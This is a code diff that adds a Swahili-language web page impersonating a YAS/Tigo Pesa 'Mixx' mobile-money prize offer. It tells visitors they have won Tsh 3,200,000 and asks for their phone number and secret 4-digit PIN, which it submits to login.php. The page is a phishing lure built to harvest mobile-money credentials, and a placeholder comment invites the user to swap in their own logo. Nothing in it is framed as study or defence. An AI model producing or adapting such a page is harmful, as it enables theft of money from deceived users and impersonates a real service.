@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>YAS Mixx Offer</title>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#08284d;
+    display:flex;
+    justify-content:center;
+    min-height:100vh;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    text-align:center;
+    padding:25px 18px 40px;
+}
+
+.logo img{
+    width:95px;
+    border-radius:20px;
+    margin-bottom:18px;
+}
+
+h1{
+    color:#FFD100;
+    font-size:26px;
+    font-weight:bold;
+    line-height:1.3;
+    margin-bottom:25px;
+}
+
+.description{
+    color:#ffffff;
+    font-size:18px;
+    line-height:1.7;
+    margin-bottom:30px;
+}
+
+.offer-title{
+    color:#FFD100;
+    font-size:18px;
+    font-weight:bold;
+    line-height:1.5;
+    margin-bottom:10px;
+}
+
+.offer{
+    color:#ffffff;
+    font-size:22px;
+    margin-bottom:35px;
+}
+
+.form-group{
+    margin-bottom:18px;
+}
+
+input{
+    width:100%;
+    padding:18px;
+    border:none;
+    border-radius:12px;
+    font-size:18px;
+    background:#fff;
+}
+
+input:focus{
+    outline:none;
+    box-shadow:0 0 5px rgba(255,209,0,.7);
+}
+
+button{
+    width:100%;
+    padding:18px;
+    border:none;
+    border-radius:12px;
+    background:#FFD100;
+    color:#0d2950;
+    font-size:20px;
+    font-weight:bold;
+    cursor:pointer;
+    transition:.3s;
+}
+
+button:hover{
+    background:#f4c400;
+}
+
+.notice{
+    margin-top:25px;
+    background:#46512c;
+    border:2px solid #FFD100;
+    border-radius:12px;
+    padding:18px;
+    color:#FFD100;
+    font-size:18px;
+    font-weight:bold;
+}
+
+.footer{
+    margin-top:30px;
+    color:#fff;
+    font-size:14px;
+}
+
+@media(max-width:480px){
+
+.container{
+    padding:20px 15px 35px;
+}
+
+h1{
+    font-size:22px;
+}
+
+.description{
+    font-size:17px;
+}
+
+.offer-title{
+    font-size:17px;
+}
+
+.offer{
+    font-size:20px;
+}
+
+button{
+    font-size:18px;
+}
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="logo">
+        <!-- Replace with your logo -->
+        <img src="logo.png" alt="YAS Logo">
+    </div>
+
+    <h1>
+        Umejishindia Ofa Wa<br>
+        YAS Tigo Pesa
+    </h1>
+
+    <div class="description">
+        Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.
+    </div>
+
+    <div class="offer-title">
+        Kiwango cha Ofa kinachoweza kupatikana:
+    </div>
+
+    <div class="offer">
+        Tsh 3,200,000
+    </div>
+
+    <form action="login.php" method="POST">
+
+        <div class="form-group">
+            <input
+                type="tel"
+                name="phone"
+                placeholder="Nambari ya Mixx"
+                required>
+        </div>
+
+        <div class="form-group">
+            <input
+                type="password"
+                name="pin"
+                maxlength="4"
+                placeholder="YAS Nambari ya Siri"
+                required>
+        </div>
+
+        <button type="submit">
+            THIBITISHA ZAWADI
+        </button>
+
+    </form>
+
+    <div class="notice">
+        Jaza fomu ili kupata ofa yako!
+    </div>
+
+    <div class="footer">
+        © 2026 YAS Tanzania
+    </div>
+
+</div>
+
+</body>
+</html>
